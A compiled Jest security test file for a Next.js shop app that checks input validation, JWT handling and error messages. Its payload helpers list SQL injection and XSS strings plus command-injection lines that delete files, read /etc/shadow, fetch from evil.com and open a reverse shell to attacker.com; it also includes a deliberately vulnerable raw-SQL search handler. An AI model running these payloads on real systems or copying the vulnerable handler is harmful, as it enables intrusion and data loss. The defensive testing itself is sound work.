0be3ffc1cfa370530dc4f46cfd8080a8
"use strict";
Object.defineProperty(exports, "__esModule", {
    value: true
});
const _globals = require("@jest/globals");
const _jsonwebtoken = /*#__PURE__*/ _interop_require_default(require("jsonwebtoken"));
const _bcryptjs = /*#__PURE__*/ _interop_require_default(require("bcryptjs"));
function _interop_require_default(obj) {
    return obj && obj.__esModule ? obj : {
        default: obj
    };
}
// Mock NextResponse
const NextResponse = {
    json: (data, init)=>({
            json: async ()=>data,
            status: init?.status || 200,
            headers: new Headers(init?.headers)
        }),
    redirect: (url, status)=>({
            status: status || 302,
            headers: new Headers({
                Location: url
            })
        })
};
// Helper function to create mock NextRequest
const createMockNextRequest = (url, options = {})=>{
    const { method = "GET", body, headers = {} } = options;
    return {
        method,
        url,
        headers: new Headers(headers),
        json: async ()=>body ? typeof body === "string" ? JSON.parse(body) : body : {},
        text: async ()=>body ? typeof body === "string" ? body : JSON.stringify(body) : ""
    };
};
// Security test utilities
class SecurityTestUtils {
    static generateSQLInjectionPayloads() {
        return [
            "'; DROP TABLE users; --",
            "' OR '1'='1",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users (email, password) VALUES ('hacker@evil.com', 'password'); --",
            "' OR 1=1 --",
            "admin'--",
            "admin'/*",
            "' OR 'x'='x",
            "') OR ('1'='1",
            "' OR 1=1#"
        ];
    }
    static generateXSSPayloads() {
        return [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "<iframe src=javascript:alert('XSS')></iframe>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>",
            "<textarea onfocus=alert('XSS') autofocus>",
            "<keygen onfocus=alert('XSS') autofocus>"
        ];
    }
    static generateCommandInjectionPayloads() {
        return [
            "; ls -la",
            "| cat /etc/passwd",
            "&& rm -rf /",
            "; cat /etc/shadow",
            "| nc -l 4444",
            "; wget http://evil.com/malware",
            "&& curl http://evil.com/steal-data",
            "; python -c 'import os; os.system(\"rm -rf /\")'",
            "| bash -i >& /dev/tcp/attacker.com/8080 0>&1",
            "; /bin/bash"
        ];
    }
    static generateLongStrings() {
        return [
            "A".repeat(1000),
            "A".repeat(10000),
            "A".repeat(100000),
            "\0".repeat(1000),
            "\n".repeat(1000),
            "\r".repeat(1000)
        ];
    }
    static generateInvalidTokens() {
        return [
            "invalid.token.here",
            "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.invalid.signature",
            "",
            "Bearer",
            "null",
            "undefined",
            "{}",
            "admin",
            "../../etc/passwd",
            '<script>alert("xss")</script>'
        ];
    }
    static async hashPassword(password) {
        return _bcryptjs.default.hash(password, 10);
    }
    static generateValidJWT(payload, secret = "test-secret") {
        return _jsonwebtoken.default.sign(payload, secret, {
            expiresIn: "1h"
        });
    }
    static generateExpiredJWT(payload, secret = "test-secret") {
        return _jsonwebtoken.default.sign(payload, secret, {
            expiresIn: "-1h"
        });
    }
}
// Mock API handlers for security testing
const mockPrisma = {
    user: {
        findUnique: jest.fn(),
        findMany: jest.fn(),
        create: jest.fn(),
        update: jest.fn()
    },
    product: {
        findMany: jest.fn(),
        create: jest.fn()
    },
    $queryRaw: jest.fn(),
    $executeRaw: jest.fn()
};
// Mock vulnerable endpoint for testing
const vulnerableSearchHandler = async (req)=>{
    const url = new URL(req.url);
    const query = url.searchParams.get("q");
    if (!query) {
        return NextResponse.json({
            error: "Query required"
        }, {
            status: 400
        });
    }
    // Simulate SQL injection vulnerability (for testing purposes)
    try {
        // This would be vulnerable in real code - DON'T DO THIS
        const results = await mockPrisma.$queryRaw`
      SELECT * FROM products WHERE name LIKE '%${query}%'
    `;
        return NextResponse.json({
            results
        });
    } catch (error) {
        return NextResponse.json({
            error: "Database error"
        }, {
            status: 500
        });
    }
};
// Secure search handler for comparison
const secureSearchHandler = async (req)=>{
    const url = new URL(req.url);
    const query = url.searchParams.get("q");
    if (!query) {
        return NextResponse.json({
            error: "Query required"
        }, {
            status: 400
        });
    }
    // Input validation
    if (query.length > 100) {
        return NextResponse.json({
            error: "Query too long"
        }, {
            status: 400
        });
    }
    // Sanitize input
    const sanitizedQuery = query.replace(/[<>"'&]/g, "");
    try {
        // Use parameterized queries
        const results = await mockPrisma.product.findMany({
            where: {
                name: {
                    contains: sanitizedQuery,
                    mode: "insensitive"
                }
            }
        });
        return NextResponse.json({
            results
        });
    } catch (error) {
        return NextResponse.json({
            error: "Database error"
        }, {
            status: 500
        });
    }
};
// Authentication handler with security measures
const secureAuthHandler = async (req)=>{
    const body = await req.json();
    const { email, password } = body;
    // Rate limiting simulation
    const clientIP = req.headers.get("x-forwarded-for") || "unknown";
    // Input validation
    if (!email || !password) {
        return NextResponse.json({
            error: "Email and password are required"
        }, {
            status: 400
        });
    }
    if (email.length > 254 || password.length > 128) {
        return NextResponse.json({
            error: "Input too long"
        }, {
            status: 400
        });
    }
    // Email format validation
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    const hasControlChars = /[\x00-\x1F\x7F]/.test(email) || /[\x00-\x1F\x7F]/.test(password);
    if (!emailRegex.test(email) || hasControlChars) {
        return NextResponse.json({
            error: "Invalid email format"
        }, {
            status: 400
        });
    }
    // Check for suspicious patterns
    const suspiciousPatterns = [
        /<script/i,
        /javascript:/i,
        /on\w+=/i,
        /\bor\b.*\b1\s*=\s*1\b/i,
        /union.*select/i,
        /drop.*table/i
    ];
    const isSuspicious = suspiciousPatterns.some((pattern)=>pattern.test(email) || pattern.test(password));
    if (isSuspicious) {
        return NextResponse.json({
            error: "Invalid input detected"
        }, {
            status: 400
        });
    }
    try {
        const user = await mockPrisma.user.findUnique({
            where: {
                email
            }
        });
        if (!user) {
            // Constant time delay to prevent timing attacks
            await new Promise((resolve)=>setTimeout(resolve, 100));
            return NextResponse.json({
                error: "Invalid credentials"
            }, {
                status: 401
            });
        }
        const isValid = await _bcryptjs.default.compare(password, user.password);
        if (!isValid) {
            return NextResponse.json({
                error: "Invalid credentials"
            }, {
                status: 401
            });
        }
        // Generate secure token
        const token = _jsonwebtoken.default.sign({
            userId: user.id,
            email: user.email,
            iat: Math.floor(Date.now() / 1000)
        }, "test-secret", {
            expiresIn: "15m",
            issuer: "md-sports",
            audience: "md-sports-client"
        });
        return NextResponse.json({
            user: {
                id: user.id,
                email: user.email,
                name: user.name
            },
            token
        });
    } catch (error) {
        return NextResponse.json({
            error: "Internal server error"
        }, {
            status: 500
        });
    }
};
(0, _globals.describe)("Security Tests", ()=>{
    (0, _globals.beforeAll)(()=>{
        process.env.JWT_SECRET = "test-secret-key-for-security-testing";
    });
    (0, _globals.beforeEach)(()=>{
        jest.clearAllMocks();
    });
    (0, _globals.describe)("SQL Injection Protection", ()=>{
        (0, _globals.it)("should prevent SQL injection in search queries", async ()=>{
            const sqlPayloads = SecurityTestUtils.generateSQLInjectionPayloads();
            for (const payload of sqlPayloads){
                const request = createMockNextRequest(`http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`);
                // Test with secure handler
                const response = await secureSearchHandler(request);
                // Should not return 500 error or expose database structure
                (0, _globals.expect)(response.status).not.toBe(500);
                const data = await response.json();
                (0, _globals.expect)(data).not.toHaveProperty("results");
            }
        });
        (0, _globals.it)("should use parameterized queries", async ()=>{
            mockPrisma.product.findMany.mockResolvedValue([]);
            const request = createMockNextRequest("http://localhost:3000/api/search?q=test' OR '1'='1");
            await secureSearchHandler(request);
            // Verify parameterized query was used
            (0, _globals.expect)(mockPrisma.product.findMany).toHaveBeenCalledWith({
                where: {
                    name: {
                        contains: "test OR 11",
                        mode: "insensitive"
                    }
                }
            });
        });
    });
    (0, _globals.describe)("XSS Protection", ()=>{
        (0, _globals.it)("should sanitize XSS payloads in input", async ()=>{
            const xssPayloads = SecurityTestUtils.generateXSSPayloads();
            for (const payload of xssPayloads){
                const request = createMockNextRequest(`http://localhost:3000/api/search?q=${encodeURIComponent(payload)}`);
                const response = await secureSearchHandler(request);
                const data = await response.json();
                // Should not contain script tags or javascript
                if (data.results) {
                    const responseStr = JSON.stringify(data);
                    (0, _globals.expect)(responseStr).not.toMatch(/<script/i);
                    (0, _globals.expect)(responseStr).not.toMatch(/javascript:/i);
                    (0, _globals.expect)(responseStr).not.toMatch(/on\w+=/i);
                }
            }
        });
        (0, _globals.it)("should reject suspicious input patterns", async ()=>{
            const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: '<script>alert("xss")</script>@test.com',
                    password: "password123"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(400);
            (0, _globals.expect)(data.error).toBe("Invalid input detected");
        });
    });
    (0, _globals.describe)("Authentication Security", ()=>{
        const testSecret = "test-secret";
        (0, _globals.it)("should reject invalid JWT tokens", async ()=>{
            const invalidTokens = SecurityTestUtils.generateInvalidTokens();
            for (const token of invalidTokens){
                (0, _globals.expect)(()=>{
                    _jsonwebtoken.default.verify(token, testSecret);
                }).toThrow();
            }
        });
        (0, _globals.it)("should reject expired tokens", async ()=>{
            const expiredToken = SecurityTestUtils.generateExpiredJWT({
                userId: 1,
                email: "test@example.com"
            }, testSecret);
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(expiredToken, testSecret);
            }).toThrow("jwt expired");
        });
        (0, _globals.it)("should use secure password hashing", async ()=>{
            const password = "testpassword123";
            const hash = await SecurityTestUtils.hashPassword(password);
            // Should be bcrypt hash
            (0, _globals.expect)(hash).toMatch(/^\$2[aby]\$\d+\$/);
            // Should not be the original password
            (0, _globals.expect)(hash).not.toBe(password);
            // Should verify correctly
            const isValid = await _bcryptjs.default.compare(password, hash);
            (0, _globals.expect)(isValid).toBe(true);
            // Should not verify with wrong password
            const isInvalid = await _bcryptjs.default.compare("wrongpassword", hash);
            (0, _globals.expect)(isInvalid).toBe(false);
        });
        (0, _globals.it)("should prevent timing attacks in authentication", async ()=>{
            const validEmail = "test@example.com";
            const invalidEmail = "nonexistent@example.com";
            // Mock user lookup
            mockPrisma.user.findUnique.mockImplementation(({ where })=>{
                if (where.email === validEmail) {
                    return Promise.resolve({
                        id: 1,
                        email: validEmail,
                        password: "$2a$10$hashedPassword",
                        name: "Test User"
                    });
                }
                return Promise.resolve(null);
            });
            const validRequest = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: validEmail,
                    password: "wrongpassword"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const invalidRequest = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: invalidEmail,
                    password: "wrongpassword"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            // Measure response times
            const start1 = Date.now();
            const response1 = await secureAuthHandler(validRequest);
            const time1 = Date.now() - start1;
            const start2 = Date.now();
            const response2 = await secureAuthHandler(invalidRequest);
            const time2 = Date.now() - start2;
            // Both should return 401
            (0, _globals.expect)(response1.status).toBe(401);
            (0, _globals.expect)(response2.status).toBe(401);
            // Response times should be similar (within 50ms)
            (0, _globals.expect)(Math.abs(time1 - time2)).toBeLessThan(50);
        });
    });
    (0, _globals.describe)("Input Validation", ()=>{
        (0, _globals.it)("should reject oversized inputs", async ()=>{
            const longStrings = SecurityTestUtils.generateLongStrings();
            for (const longString of longStrings){
                const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email: longString,
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                (0, _globals.expect)(response.status).toBe(400);
            }
        });
        (0, _globals.it)("should validate email format", async ()=>{
            const invalidEmails = [
                "invalid-email",
                "@domain.com",
                "user@",
                "user..name@domain.com",
                "user@domain",
                "",
                "user name@domain.com"
            ];
            for (const email of invalidEmails){
                const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email,
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                const data = await response.json();
                (0, _globals.expect)(response.status).toBe(400);
                (0, _globals.expect)(data.error).toBe("Invalid email format");
            }
        });
        (0, _globals.it)("should handle null bytes and special characters", async ()=>{
            const maliciousInputs = [
                "test\0@example.com",
                "test\r\n@example.com",
                "test	@example.com",
                "test\b@example.com"
            ];
            for (const input of maliciousInputs){
                const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email: input,
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json"
                    }
                });
                const response = await secureAuthHandler(request);
                (0, _globals.expect)(response.status).toBe(400);
            }
        });
    });
    (0, _globals.describe)("Command Injection Protection", ()=>{
        (0, _globals.it)("should prevent command injection in file operations", ()=>{
            const commandPayloads = SecurityTestUtils.generateCommandInjectionPayloads();
            for (const payload of commandPayloads){
                // Simulate file name validation
                const isValidFileName = (filename)=>{
                    // Only allow alphanumeric, dots, hyphens, and underscores
                    return /^[a-zA-Z0-9._-]+$/.test(filename);
                };
                (0, _globals.expect)(isValidFileName(payload)).toBe(false);
            }
        });
    });
    (0, _globals.describe)("JWT Security", ()=>{
        const testSecret = "test-secret";
        (0, _globals.it)("should use secure JWT configuration", ()=>{
            const payload = {
                userId: 1,
                email: "test@example.com"
            };
            const secret = "test-secret";
            const token = SecurityTestUtils.generateValidJWT(payload, secret);
            const decoded = _jsonwebtoken.default.verify(token, secret);
            (0, _globals.expect)(decoded.userId).toBe(1);
            (0, _globals.expect)(decoded.email).toBe("test@example.com");
            (0, _globals.expect)(decoded.iat).toBeDefined();
            (0, _globals.expect)(decoded.exp).toBeDefined();
        });
        (0, _globals.it)("should not accept tokens with none algorithm", ()=>{
            // Create a token with 'none' algorithm (security vulnerability)
            const header = Buffer.from(JSON.stringify({
                alg: "none",
                typ: "JWT"
            })).toString("base64url");
            const payload = Buffer.from(JSON.stringify({
                userId: 1,
                email: "test@example.com"
            })).toString("base64url");
            const noneToken = `${header}.${payload}.`;
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(noneToken, testSecret);
            }).toThrow();
        });
        (0, _globals.it)("should validate token signature", ()=>{
            const validToken = SecurityTestUtils.generateValidJWT({
                userId: 1
            }, testSecret);
            const [header, payload, signature] = validToken.split(".");
            const tamperedToken = `${header}.${payload}.tampered_signature`;
            (0, _globals.expect)(()=>{
                _jsonwebtoken.default.verify(tamperedToken, testSecret);
            }).toThrow("invalid signature");
        });
    });
    (0, _globals.describe)("Rate Limiting Simulation", ()=>{
        (0, _globals.it)("should handle rapid successive requests", async ()=>{
            const requests = Array.from({
                length: 100
            }, ()=>createMockNextRequest("http://localhost:3000/api/auth/login", {
                    method: "POST",
                    body: {
                        email: "test@example.com",
                        password: "password123"
                    },
                    headers: {
                        "Content-Type": "application/json",
                        "X-Forwarded-For": "192.168.1.100"
                    }
                }));
            // In a real implementation, this would trigger rate limiting
            const responses = await Promise.all(requests.map((req)=>secureAuthHandler(req)));
            // All requests should be processed (in real app, some would be rate limited)
            responses.forEach((response)=>{
                (0, _globals.expect)([
                    400,
                    401,
                    429
                ]).toContain(response.status); // 429 = Too Many Requests
            });
        });
    });
    (0, _globals.describe)("Error Handling Security", ()=>{
        (0, _globals.it)("should not expose sensitive information in error messages", async ()=>{
            // Simulate database error
            mockPrisma.user.findUnique.mockRejectedValue(new Error('Connection failed to database "md_sports" on host "localhost"'));
            const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: "test@example.com",
                    password: "password123"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(500);
            (0, _globals.expect)(data.error).toBe("Internal server error");
            (0, _globals.expect)(data.error).not.toContain("database");
            (0, _globals.expect)(data.error).not.toContain("localhost");
            (0, _globals.expect)(data.error).not.toContain("md_sports");
        });
        (0, _globals.it)("should use generic error messages for authentication failures", async ()=>{
            mockPrisma.user.findUnique.mockResolvedValue(null);
            const request = createMockNextRequest("http://localhost:3000/api/auth/login", {
                method: "POST",
                body: {
                    email: "nonexistent@example.com",
                    password: "password123"
                },
                headers: {
                    "Content-Type": "application/json"
                }
            });
            const response = await secureAuthHandler(request);
            const data = await response.json();
            (0, _globals.expect)(response.status).toBe(401);
            (0, _globals.expect)(data.error).toBe("Invalid credentials");
            (0, _globals.expect)(data.error).not.toContain("user not found");
            (0, _globals.expect)(data.error).not.toContain("email");
        });
    });
});

//# sourceMappingURL=data:application/json;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbIi9Vc2Vycy9zYWNoaW4vRG9jdW1lbnRzL21kLXNwb3J0cy0vdGVzdHMvc2VjdXJpdHkvc2VjdXJpdHkudGVzdC50cyJdLCJzb3VyY2VzQ29udGVudCI6WyJpbXBvcnQgeyBkZXNjcmliZSwgaXQsIGV4cGVjdCwgYmVmb3JlQWxsLCBhZnRlckFsbCwgYmVmb3JlRWFjaCB9IGZyb20gJ0BqZXN0L2dsb2JhbHMnO1xuaW1wb3J0IGp3dCBmcm9tICdqc29ud2VidG9rZW4nO1xuaW1wb3J0IGJjcnlwdCBmcm9tICdiY3J5cHRqcyc7XG5pbXBvcnQgY3J5cHRvIGZyb20gJ2NyeXB0byc7XG5cbi8vIE1vY2sgTmV4dFJlc3BvbnNlXG5jb25zdCBOZXh0UmVzcG9uc2UgPSB7XG4gIGpzb246IChkYXRhOiBhbnksIGluaXQ/OiBSZXNwb25zZUluaXQpID0+ICh7XG4gICAganNvbjogYXN5bmMgKCkgPT4gZGF0YSxcbiAgICBzdGF0dXM6IGluaXQ/LnN0YXR1cyB8fCAyMDAsXG4gICAgaGVhZGVyczogbmV3IEhlYWRlcnMoaW5pdD8uaGVhZGVycyksXG4gIH0pLFxuICByZWRpcmVjdDogKHVybDogc3RyaW5nLCBzdGF0dXM/OiBudW1iZXIpID0+ICh7XG4gICAgc3RhdHVzOiBzdGF0dXMgfHwgMzAyLFxuICAgIGhlYWRlcnM6IG5ldyBIZWFkZXJzKHsgTG9jYXRpb246IHVybCB9KSxcbiAgfSksXG59O1xuXG4vLyBIZWxwZXIgZnVuY3Rpb24gdG8gY3JlYXRlIG1vY2sgTmV4dFJlcXVlc3RcbmNvbnN0IGNyZWF0ZU1vY2tOZXh0UmVxdWVzdCA9ICh1cmw6IHN0cmluZywgb3B0aW9uczoge1xuICBtZXRob2Q/OiBzdHJpbmc7XG4gIGJvZHk/OiBhbnk7XG4gIGhlYWRlcnM/OiBSZWNvcmQ8c3RyaW5nLCBzdHJpbmc+O1xufSA9IHt9KTogYW55ID0+IHtcbiAgY29uc3QgeyBtZXRob2QgPSAnR0VUJywgYm9keSwgaGVhZGVycyA9IHt9IH0gPSBvcHRpb25zO1xuICByZXR1cm4ge1xuICAgIG1ldGhvZCxcbiAgICB1cmwsXG4gICAgaGVhZGVyczogbmV3IEhlYWRlcnMoaGVhZGVycyksXG4gICAganNvbjogYXN5bmMgKCkgPT4gYm9keSA/ICh0eXBlb2YgYm9keSA9PT0gJ3N0cmluZycgPyBKU09OLnBhcnNlKGJvZHkpIDogYm9keSkgOiB7fSxcbiAgICB0ZXh0OiBhc3luYyAoKSA9PiBib2R5ID8gKHR5cGVvZiBib2R5ID09PSAnc3RyaW5nJyA/IGJvZHkgOiBKU09OLnN0cmluZ2lmeShib2R5KSkgOiAnJyxcbiAgfTtcbn07XG5cbi8vIFNlY3VyaXR5IHRlc3QgdXRpbGl0aWVzXG5jbGFzcyBTZWN1cml0eVRlc3RVdGlscyB7XG4gIHN0YXRpYyBnZW5lcmF0ZVNRTEluamVjdGlvblBheWxvYWRzKCk6IHN0cmluZ1tdIHtcbiAgICByZXR1cm4gW1xuICAgICAgXCInOyBEUk9QIFRBQkxFIHVzZXJzOyAtLVwiLFxuICAgICAgXCInIE9SICcxJz0nMVwiLFxuICAgICAgXCInIFVOSU9OIFNFTEVDVCAqIEZST00gdXNlcnMgLS1cIixcbiAgICAgIFwiJzsgSU5TRVJUIElOVE8gdXNlcnMgKGVtYWlsLCBwYXNzd29yZCkgVkFMVUVTICgnaGFja2VyQGV2aWwuY29tJywgJ3Bhc3N3b3JkJyk7IC0tXCIsXG4gICAgICBcIicgT1IgMT0xIC0tXCIsXG4gICAgICBcImFkbWluJy0tXCIsXG4gICAgICBcImFkbWluJy8qXCIsXG4gICAgICBcIicgT1IgJ3gnPSd4XCIsXG4gICAgICBcIicpIE9SICgnMSc9JzFcIixcbiAgICAgIFwiJyBPUiAxPTEjXCIsXG4gICAgXTtcbiAgfVxuXG4gIHN0YXRpYyBnZW5lcmF0ZVhTU1BheWxvYWRzKCk6IHN0cmluZ1tdIHtcbiAgICByZXR1cm4gW1xuICAgICAgXCI8c2NyaXB0PmFsZXJ0KCdYU1MnKTwvc2NyaXB0PlwiLFxuICAgICAgXCJqYXZhc2NyaXB0OmFsZXJ0KCdYU1MnKVwiLFxuICAgICAgXCI8aW1nIHNyYz14IG9uZXJyb3I9YWxlcnQoJ1hTUycpPlwiLFxuICAgICAgXCI8c3ZnIG9ubG9hZD1hbGVydCgnWFNTJyk+XCIsXG4gICAgICBcIjxpZnJhbWUgc3JjPWphdmFzY3JpcHQ6YWxlcnQoJ1hTUycpPjwvaWZyYW1lPlwiLFxuICAgICAgXCI8Ym9keSBvbmxvYWQ9YWxlcnQoJ1hTUycpPlwiLFxuICAgICAgXCI8aW5wdXQgb25mb2N1cz1hbGVydCgnWFNTJykgYXV0b2ZvY3VzPlwiLFxuICAgICAgXCI8c2VsZWN0IG9uZm9jdXM9YWxlcnQoJ1hTUycpIGF1dG9mb2N1cz5cIixcbiAgICAgIFwiPHRleHRhcmVhIG9uZm9jdXM9YWxlcnQoJ1hTUycpIGF1dG9mb2N1cz5cIixcbiAgICAgIFwiPGtleWdlbiBvbmZvY3VzPWFsZXJ0KCdYU1MnKSBhdXRvZm9jdXM+XCIsXG4gICAgXTtcbiAgfVxuXG4gIHN0YXRpYyBnZW5lcmF0ZUNvbW1hbmRJbmplY3Rpb25QYXlsb2FkcygpOiBzdHJpbmdbXSB7XG4gICAgcmV0dXJuIFtcbiAgICAgIFwiOyBscyAtbGFcIixcbiAgICAgIFwifCBjYXQgL2V0Yy9wYXNzd2RcIixcbiAgICAgIFwiJiYgcm0gLXJmIC9cIixcbiAgICAgIFwiOyBjYXQgL2V0Yy9zaGFkb3dcIixcbiAgICAgIFwifCBuYyAtbCA0NDQ0XCIsXG4gICAgICBcIjsgd2dldCBodHRwOi8vZXZpbC5jb20vbWFsd2FyZVwiLFxuICAgICAgXCImJiBjdXJsIGh0dHA6Ly9ldmlsLmNvbS9zdGVhbC1kYXRhXCIsXG4gICAgICBcIjsgcHl0aG9uIC1jICdpbXBvcnQgb3M7IG9zLnN5c3RlbShcXFwicm0gLXJmIC9cXFwiKSdcIixcbiAgICAgIFwifCBiYXNoIC1pID4mIC9kZXYvdGNwL2F0dGFja2VyLmNvbS84MDgwIDA+JjFcIixcbiAgICAgIFwiOyAvYmluL2Jhc2hcIixcbiAgICBdO1xuICB9XG5cbiAgc3RhdGljIGdlbmVyYXRlTG9uZ1N0cmluZ3MoKTogc3RyaW5nW10ge1xuICAgIHJldHVybiBbXG4gICAgICAnQScucmVwZWF0KDEwMDApLFxuICAgICAgJ0EnLnJlcGVhdCgxMDAwMCksXG4gICAgICAnQScucmVwZWF0KDEwMDAwMCksXG4gICAgICAnXFx4MDAnLnJlcGVhdCgxMDAwKSwgLy8gTnVsbCBieXRlc1xuICAgICAgJ1xcbicucmVwZWF0KDEwMDApLCAvLyBOZXdsaW5lc1xuICAgICAgJ1xccicucmVwZWF0KDEwMDApLCAvLyBDYXJyaWFnZSByZXR1cm5zXG4gICAgXTtcbiAgfVxuXG4gIHN0YXRpYyBnZW5lcmF0ZUludmFsaWRUb2tlbnMoKTogc3RyaW5nW10ge1xuICAgIHJldHVybiBbXG4gICAgICAnaW52YWxpZC50b2tlbi5oZXJlJyxcbiAgICAgICdleUpoYkdjaU9pSklVekkxTmlJc0luUjVjQ0k2SWtwWFZDSjkuaW52YWxpZC5zaWduYXR1cmUnLFxuICAgICAgJycsIC8vIEVtcHR5IHRva2VuXG4gICAgICAnQmVhcmVyJywgLy8gSnVzdCBCZWFyZXJcbiAgICAgICdudWxsJyxcbiAgICAgICd1bmRlZmluZWQnLFxuICAgICAgJ3t9JyxcbiAgICAgICdhZG1pbicsXG4gICAgICAnLi4vLi4vZXRjL3Bhc3N3ZCcsXG4gICAgICAnPHNjcmlwdD5hbGVydChcInhzc1wiKTwvc2NyaXB0PicsXG4gICAgXTtcbiAgfVxuXG4gIHN0YXRpYyBhc3luYyBoYXNoUGFzc3dvcmQocGFzc3dvcmQ6IHN0cmluZyk6IFByb21pc2U8c3RyaW5nPiB7XG4gICAgcmV0dXJuIGJjcnlwdC5oYXNoKHBhc3N3b3JkLCAxMCk7XG4gIH1cblxuICBzdGF0aWMgZ2VuZXJhdGVWYWxpZEpXVChwYXlsb2FkOiBhbnksIHNlY3JldDogc3RyaW5nID0gJ3Rlc3Qtc2VjcmV0Jyk6IHN0cmluZyB7XG4gICAgcmV0dXJuIGp3dC5zaWduKHBheWxvYWQsIHNlY3JldCwgeyBleHBpcmVzSW46ICcxaCcgfSk7XG4gIH1cblxuICBzdGF0aWMgZ2VuZXJhdGVFeHBpcmVkSldUKHBheWxvYWQ6IGFueSwgc2VjcmV0OiBzdHJpbmcgPSAndGVzdC1zZWNyZXQnKTogc3RyaW5nIHtcbiAgICByZXR1cm4gand0LnNpZ24ocGF5bG9hZCwgc2VjcmV0LCB7IGV4cGlyZXNJbjogJy0xaCcgfSk7XG4gIH1cbn1cblxuLy8gTW9jayBBUEkgaGFuZGxlcnMgZm9yIHNlY3VyaXR5IHRlc3RpbmdcbmNvbnN0IG1vY2tQcmlzbWEgPSB7XG4gIHVzZXI6IHtcbiAgICBmaW5kVW5pcXVlOiBqZXN0LmZuKCksXG4gICAgZmluZE1hbnk6IGplc3QuZm4oKSxcbiAgICBjcmVhdGU6IGplc3QuZm4oKSxcbiAgICB1cGRhdGU6IGplc3QuZm4oKSxcbiAgfSxcbiAgcHJvZHVjdDoge1xuICAgIGZpbmRNYW55OiBqZXN0LmZuKCksXG4gICAgY3JlYXRlOiBqZXN0LmZuKCksXG4gIH0sXG4gICRxdWVyeVJhdzogamVzdC5mbigpLFxuICAkZXhlY3V0ZVJhdzogamVzdC5mbigpLFxufTtcblxuLy8gTW9jayB2dWxuZXJhYmxlIGVuZHBvaW50IGZvciB0ZXN0aW5nXG5jb25zdCB2dWxuZXJhYmxlU2VhcmNoSGFuZGxlciA9IGFzeW5jIChyZXE6IE5leHRSZXF1ZXN0KSA9PiB7XG4gIGNvbnN0IHVybCA9IG5ldyBVUkwocmVxLnVybCk7XG4gIGNvbnN0IHF1ZXJ5ID0gdXJsLnNlYXJjaFBhcmFtcy5nZXQoJ3EnKTtcbiAgXG4gIGlmICghcXVlcnkpIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oeyBlcnJvcjogJ1F1ZXJ5IHJlcXVpcmVkJyB9LCB7IHN0YXR1czogNDAwIH0pO1xuICB9XG5cbiAgLy8gU2ltdWxhdGUgU1FMIGluamVjdGlvbiB2dWxuZXJhYmlsaXR5IChmb3IgdGVzdGluZyBwdXJwb3NlcylcbiAgdHJ5IHtcbiAgICAvLyBUaGlzIHdvdWxkIGJlIHZ1bG5lcmFibGUgaW4gcmVhbCBjb2RlIC0gRE9OJ1QgRE8gVEhJU1xuICAgIGNvbnN0IHJlc3VsdHMgPSBhd2FpdCBtb2NrUHJpc21hLiRxdWVyeVJhd2BcbiAgICAgIFNFTEVDVCAqIEZST00gcHJvZHVjdHMgV0hFUkUgbmFtZSBMSUtFICclJHtxdWVyeX0lJ1xuICAgIGA7XG4gICAgXG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHsgcmVzdWx0cyB9KTtcbiAgfSBjYXRjaCAoZXJyb3IpIHtcbiAgICByZXR1cm4gTmV4dFJlc3BvbnNlLmpzb24oeyBlcnJvcjogJ0RhdGFiYXNlIGVycm9yJyB9LCB7IHN0YXR1czogNTAwIH0pO1xuICB9XG59O1xuXG4vLyBTZWN1cmUgc2VhcmNoIGhhbmRsZXIgZm9yIGNvbXBhcmlzb25cbmNvbnN0IHNlY3VyZVNlYXJjaEhhbmRsZXIgPSBhc3luYyAocmVxOiBOZXh0UmVxdWVzdCkgPT4ge1xuICBjb25zdCB1cmwgPSBuZXcgVVJMKHJlcS51cmwpO1xuICBjb25zdCBxdWVyeSA9IHVybC5zZWFyY2hQYXJhbXMuZ2V0KCdxJyk7XG4gIFxuICBpZiAoIXF1ZXJ5KSB7XG4gICAgcmV0dXJuIE5leHRSZXNwb25zZS5qc29uKHsgZXJyb3I6ICdRdWVyeSByZXF1aXJlZCcgfSwgeyBzdGF0dXM6IDQwMCB9KTtcbiAgfVxuXG4gIC8vIElucHV0IHZhbGlkYXRpb25cbiAgaWYgKHF1ZXJ5Lmxlbmd0aCA+IDEwMCkge1xuICAgIHJldHVybiBOZXh0UmVzcG9uc2UuanNvbih7IGVycm9yOiAnUXVlcnkgdG9vIGxvbmcnIH0sIHsgc3RhdHVzOiA0MDAgfSk7XG4gIH1cblxuICAvLyBTYW5pdGl6ZSBpbnB1dFxuICBjb25zdCBzYW5pdGl6ZWRRdWVyeSA9IHF1ZXJ5LnJlcGxhY2UoL1s8PlwiJyZdL2csICcnKTtcbiAgXG4gIHRyeSB7XG4gICAgLy8gVXN